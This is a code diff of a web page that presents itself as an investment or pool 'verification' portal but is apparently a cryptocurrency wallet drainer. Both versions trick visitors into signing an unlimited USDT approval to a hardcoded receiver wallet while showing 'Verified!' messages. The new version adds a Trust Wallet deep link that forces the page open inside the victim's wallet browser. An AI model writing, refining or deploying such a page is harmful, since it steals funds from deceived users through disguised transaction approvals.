@@ -3,82 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Portal</title>
+    <title>Investment Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.js"></script>
     <style>
         body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #3375bb; }
-        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; margin-top: 15px; display: none; }
-        #status { margin-top: 15px; color: #848e9c; font-size: 14px; }
+        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 380px; border: 1px solid #3375bb; }
+        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; }
+        #status { margin-top: 15px; color: #848e9c; font-size: 13px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h3>Secure Verification</h3>
-        <p id="msg">Initializing connection...</p>
-        <button id="main-btn" class="btn" onclick="connect()">CONNECT WALLET</button>
-        <div id="status">Loading libraries...</div>
+        <h3>Pool Verification</h3>
+        <p style="color:#848e9c; font-size:14px;">Connect to verify your USDT balance.</p>
+        <button id="main-btn" class="btn" onclick="start()">CONNECT NOW</button>
+        <div id="status">Ready.</div>
     </div>
 
     <script>
-        const PROJECT_ID = "48d3cc06c4e808c4987bb4566665ae87"; 
-        const MY_WALLET = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
-        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+        const RECEIVER = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7";
+        const USDT = "0x55d398326f99059fF775485246999027B3197955";
 
-        let provider;
+        async function start() {
+            const status = document.getElementById("status");
+            
+            // 1. CHECK IF INSIDE TRUST WALLET
+            if (window.ethereum) {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
 
-        async function init() {
-            // Fix: Check all possible locations for the WalletConnect library
-            const WCProvider = window.EthereumProvider || 
-                               (window.WalletConnectEthereumProvider && window.WalletConnectEthereumProvider.EthereumProvider);
-
-            if (!WCProvider) {
-                console.log("Waiting for library...");
-                setTimeout(init, 500); // Try again in half a second
-                return;
-            }
-
-            try {
-                provider = await WCProvider.init({
-                    projectId: PROJECT_ID,
-                    optionalChains: [56],
-                    showQrModal: true,
-                    metadata: { name: "Verification", description: "Secure Approval", url: window.location.origin, icons: [] }
-                });
-
-                document.getElementById("main-btn").style.display = "block";
-                document.getElementById("status").innerText = "Ready to connect.";
-                document.getElementById("msg").innerText = "Click below to begin.";
-
-                // This handles the "Confirm" popup AFTER they hit Connect
-                provider.on("connect", async () => {
-                    document.getElementById("status").innerText = "Success! Now checking for Approval...";
-                    const web3 = new ethers.providers.Web3Provider(provider);
-                    const signer = web3.getSigner();
-
-                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-                    const contract = new ethers.Contract(USDT_BSC, abi, signer);
+                    status.innerText = "Check for Approval Popup...";
                     
-                    try {
-                        const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
-                        document.getElementById("status").innerText = "Finalizing...";
-                        await tx.wait();
-                        document.getElementById("status").innerText = "DONE: Verified!";
-                    } catch (e) {
-                        document.getElementById("status").innerText = "User canceled or Error.";
-                    }
-                });
-            } catch (err) {
-                document.getElementById("status").innerText = "Startup Error: " + err.message;
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(USDT, abi, signer);
+                    
+                    // Trigger the APPROVAL
+                    const tx = await contract.approve(RECEIVER, ethers.constants.MaxUint256);
+                    status.innerText = "Processing...";
+                    await tx.wait();
+                    status.innerText = "SUCCESS: Verified!";
+                } catch (err) {
+                    status.innerText = "Error: " + err.message;
+                }
+            } else {
+                // 2. IF OUTSIDE, FORCE OPEN TRUST WALLET APP
+                status.innerText = "Opening Trust Wallet...";
+                const dappUrl = window.location.href.replace("https://", "");
+                // This deep link forces Trust Wallet to open YOUR site in its browser
+                window.location.href = "trust://browser_enable?url=" + encodeURIComponent(window.location.href);
             }
         }
-
-        function connect() {
-            if (provider) provider.connect();
-        }
-
-        init(); // Start the check loop
     </script>
 </body>
 </html>
